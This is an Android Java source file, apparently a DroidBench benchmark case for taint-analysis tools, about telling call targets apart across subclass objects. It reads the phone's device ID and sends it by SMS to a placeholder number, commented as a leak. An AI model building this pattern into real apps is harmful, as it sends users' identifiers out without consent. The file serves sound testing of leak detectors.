package edu.mit;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.widget.EditText;

import android.telephony.TelephonyManager;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        B.mgr = (TelephonyManager) this.getSystemService(Activity.TELEPHONY_SERVICE);       
      
        Test test1 = new Test();
        Test test2 = new Test();
        A b = new B();
        A c = new C();

        SmsManager smsmanager = SmsManager.getDefault();

        smsmanager.sendTextMessage("+49 1234", null, test1.method(b), null, null); //sink, leak
        Log.i("DroidBench", test2.method(c)); //sink, no leak
     }
}

class Test {
    public String method(A a) {        
        return a.f();  // uses the context insensitive pta for call targets
    }
}

class A {
    public String f() {
        return "untainted";
    }
}

class B extends A {
    public static TelephonyManager mgr;
    public String f() {
        return mgr.getDeviceId();
    }
}

class C extends A {
    public String f() {
        return "not tainted";
    }
}
